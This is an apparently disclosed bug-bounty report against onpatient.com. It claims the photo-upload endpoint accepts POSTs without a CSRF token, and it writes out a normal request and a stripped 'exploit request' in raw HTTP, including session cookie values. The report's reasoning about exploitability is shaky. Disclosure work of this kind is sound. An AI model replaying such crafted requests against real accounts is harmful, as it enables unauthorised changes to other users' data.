# Request Accepts without X-CSRFToken  [ Header - Cookie ]

## Report Details
- **Report ID**: 99857
- **URL**: https://hackerone.com/reports/99857
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-11-15T18:29:23.345Z
- **Disclosed**: 2016-08-31T04:44:27.662Z

## Reporter
- **Username**: hussain_0x3c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: drchrono

## Vulnerability Information
**Hi** 
This is  Hussain and when I test upload  photo on onpatient.com  ..  I'm found  bug in header request  the problem request  accepted upload photo  without X-CSRFToken   .. so  attacker  can delete X-CSRFToken in cookie and  value header and continue in the process to upload  photo in other account 

**True request**
~~~
POST /photos/album/1701/upload_photo/ HTTP/1.1
Host: onpatient.com
Connection: keep-alive
Content-Length: 40467
Accept: application/json, text/plain, */*
X-NewRelic-ID: VQYOWFNSGwICUlhbBQU=
Origin: https://onpatient.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36
X-CSRFToken: TEVbZs25uEcxoc1V4U2HDY4G0BKRp3sK
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykSrEKi5Qq1ui4VGe
Referer: https://onpatient.com/photos/album/1701/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: km_lv=x; ajs_anonymous_id=%22bc8b3663-2372-4486-9753-84c5679ca58d%22; ajs_user_id=null; ajs_group_id=null; mp_7bbc3c668b5b055f3deebefcadd51c1f_mixpanel=%7B%22distinct_id%22%3A%20%2215105a2b1283b-09e626f77-671b127a-100200-15105a2b12912e%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; olfsk=olfsk08225689781829715; hblid=q1t5IWHaj65y1YE00P21I74nDMOJ0EQ6; __utmt=1; sessionid=k7c07ho1vqx2op6610g8hffa9165yb8m; csrftoken=TEVbZs25uEcxoc1V4U2HDY4G0BKRp3sK; __cfduid=d9672408dff0d22f2aa692141bcfec9271447607104; __utma=10369259.2030467177.1447458874.1447526591.1447606759.7; __utmb=10369259.5.10.1447606759; __utmc=10369259; __utmz=10369259.1447526591.6.3.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); kvcd=1447607115853; km_ai=hussain%40gmail.com_168065; km_ni=hussain%40gmail.com_168065; km_vs=1; km_uq=

--Source photo--

------WebKitFormBoundarykSrEKi5Qq1ui4VGe
Content-Disposition: form-data; name="image"; filename="11813317_497569053731969_6730983602456585420_n.jpg"
Content-Type: image/jpeg

----------1082674095
Content-Disposition: form-data; name="title"

test
----------1082674095
Content-Disposition: form-data; name="description"

test
----------1082674095--

~~~
**Response -1** :- {"album": "1701", "success": true}


**Exploit request**
~~~
POST /photos/album/1701/upload_photo/ HTTP/1.1
Host: onpatient.com
Connection: keep-alive
Content-Length: 240
Accept: application/json, text/plain, */*
Origin: https://onpatient.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36
Content-Type: multipart/form-data; boundary=--------1082674095
Referer: https://onpatient.com/photos/album/1701/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: sessionid=k7c07ho1vqx2op6610g8hffa9165yb8m
X-dotNet-Beautifier: 85; DO-NOT-REMOVE

--Source photo--

----------1082674095
Content-Disposition: form-data; name="title"

test2
----------1082674095
Content-Disposition: form-data; name="description"

test2
----------1082674095
~~~
**Response** **-2** :- {"album": "1701", "success": true}

photo  upload without **X-CSRFToken**

**Note** :- sessionid It does not prevent anything in the method post he work on  PUT and GET

Be Safe 
Thanks  
Hussain




## Attachments
No attachments
